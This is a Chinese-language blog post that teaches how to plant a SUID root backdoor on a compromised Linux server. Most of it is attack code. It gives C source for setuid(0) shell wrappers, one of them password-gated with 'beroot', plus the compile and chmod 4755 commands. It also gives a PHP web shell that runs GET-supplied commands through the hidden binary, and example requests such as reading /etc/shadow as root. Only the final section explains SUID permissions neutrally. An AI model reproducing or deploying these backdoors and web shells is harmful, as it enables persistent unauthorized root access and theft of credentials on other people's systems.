---
layout: post
title: suid后门（suid shell）
date: 2018-06-26 23:30:00
tags: 后门 suid
categories: hack 
author: PythonPig
---
* content
{:toc}
suid shell 是可以以shell所有者权限运行的shell。 

### \#0x00 suid shell生成

suid shell简单代码：  
```c
#include<stdlib.h>
main () {
setuid(0);
system("/bin/bash");
}
```




切换至root下，执行：  
gcc bashwrap.c -o bashwrap  
chmod 4755 bashwrap  （赋予suid权限）  

此时bashwrap就是一个suid shell  

### \#0x01 suid shell调用（PHP环境）

把suid shell隐藏在目标系统上(假设放在/tmp/目录下)，通过web的方式调用（假设webshell权限较低，希望使用suid shell执行root命令），假如web环境是PHP，在web目录下上传如下PHP文件：  
```php 
<?php
if(isset($_GET['path']) && isset($_GET['cmd'])){
 $path = $_GET['path'];
 $cmd = $_GET['cmd'];
 $descriptorspec = array(
  0 => array("pipe", "r"),
  1 => array("pipe", "w"),
  2 => array("pipe", "w")
 );
 $process = proc_open($path, $descriptorspec, $pipes);
 if (is_resource($process)) {
  fwrite($pipes[0],$cmd);
  fclose($pipes[0]);
  echo stream_get_contents($pipes[1]);
  echo stream_get_contents($pipes[2]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  $return_value = proc_close($process);
 }  
}
>
```  

访问http://x.x.x.x/exploit.php?path=/tmp/bashwrap&cmd=id即可以root的权限执行命令id  

注：  
1、webshell的权限较低，但是已经完成了提权，可以使用上述方式留下root后门；  
2、利用webshell提权时，把exp上传至/tmp/exp，访问http://x.x.x.x/exploit.php?path=/tmp/exp&cmd=id，若提权成功，则会以root权限执行命令id。  

### \#0x02 suid shell调用（非PHP环境）  

在非PHP环境下使用如下代码生成suid shell
```c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    char buf[256]={0};
    if(strcmp(argv[1],"beroot") == 0)
    {
        setuid(0);
        int i;
        for(i = 2; i < argc; i ++){
            strcat(buf, argv[i]);
            strcat(buf," ");
        }
        execl("/bin/sh","sh","-c", buf,(char *)0);
        return 0;
    }
    else
    {
            printf("%s\n","Execution Error!");
            return -1;
    }
    return 0;
}
``` 

然后在低权限的web shell命令执行处执行：./bashwrap beroot cat /etc/shadow即可以root权限执行cat /etc/shadow  

### \#0x03 suid介绍

当s这个标志出现在文件所有者的x权限上时，此时就被称为Set UID，简程SUID。  
例如执行ls -l /bin/su可以看到   
![1](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/suid%20shell/1.jpg?raw=true)  
执行ls -l /usr/bin/passwd 可以看到     
![2](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/suid%20shell/2.jpg?raw=true)  
在文件所有者的x权限上都出现了s权限，那么这个特殊权限的特殊性的作用是什么呢？  
```
1、SUID权限仅对二进制程序有效。  
2、执行者对于该程序需要具有x的可执行权限。 
3、本权限仅在执行该程序的过程中有效。  
4、执行者将具有该程序拥有者的权限。  
``` 

SUID的关键作用体现在第四句，SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。  
### \#0x04 参考
[深入Linux文件权限 SUID/SGID/SBIT](https://blog.csdn.net/imkelt/article/details/53054309)  
文章中部分源代码在前辈代码的基础上略做修改，由于时间久远，现在已经不知道代码摘自何处，若作者看到，请速联系（联系方式见about标签）
